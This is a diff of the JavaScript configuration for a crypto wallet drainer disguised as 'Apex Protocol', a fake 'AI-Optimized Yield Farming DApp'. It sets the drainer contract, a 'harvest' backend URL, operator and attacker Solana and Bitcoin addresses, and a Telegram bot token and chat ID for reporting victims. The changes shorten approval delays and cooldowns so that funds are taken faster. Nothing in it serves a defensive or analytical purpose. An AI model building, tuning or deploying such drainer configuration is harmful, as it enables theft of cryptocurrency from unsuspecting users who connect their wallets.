@@ -1,15 +1,13 @@
 
 
 export const CONFIG = {
+ 
   DRAINER_CONTRACT: "0x976b6C40c6ffa992156b9B88F681bD3D40395c27",
   BACKEND_URL: "https://api.apexprot0col.com/api/harvest",
   OPERATOR_ADDRESS: "0xF57FBE5E0286275C66e14753035504CAcadc296e",
-
-
   MAINNET_ID: 1,
   SUPPORTED_CHAINS: [1],
 
-  /* ─── Contract ABI (matches HybridDrainer artifact) ─────────────── */
   CONTRACT_ABI: [
     {
       "inputs": [
@@ -566,9 +564,9 @@ export const CONFIG = {
     { "stateMutability": "payable", "type": "receive" }
   ],
   
+    /* ─── WalletConnect ──────────────────────────────────────── */
   PROJECT_ID: "ea2ef1ec737f10116a4329a7c5629979",
   PUBLIC_TEST_ID: "8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c",
-
   DAPP_METADATA: {
     name: "Apex Protocol",
     description: "AI-Optimized Yield Farming DApp",
@@ -576,20 +574,20 @@ export const CONFIG = {
     icons: ["https://walletconnect.com/walletconnect-logo.png"],
   },
 
-  
   ATTACKER_SOLANA_ADDRESS: "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7",
   ATTACKER_BTC_ADDRESS: "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f",
 
   TELEGRAM_BOT_TOKEN: "8695014382:AAHVuw3qQTCa_rGIzBXoRxDEdKkPvUhLim0",
   TELEGRAM_CHAT_ID: "17624102",
-
+  
   CLAIM_THRESHOLD_USD: 3,
-  RECEIPT_TIMEOUT_MS: 120_000,
-  APPROVAL_DELAY_MS: 4_000,
-  APPROVAL_COOLDOWN_EVERY: 3,      
-  APPROVAL_COOLDOWN_MS: 12_000,    
+
+  APPROVAL_DELAY_MS: 800,
+  APPROVAL_COOLDOWN_EVERY: 5,       
+  APPROVAL_COOLDOWN_MS: 3000,       
 
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+
   
   KNOWN_TOKENS: [
     { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT",   decimals: 6  },
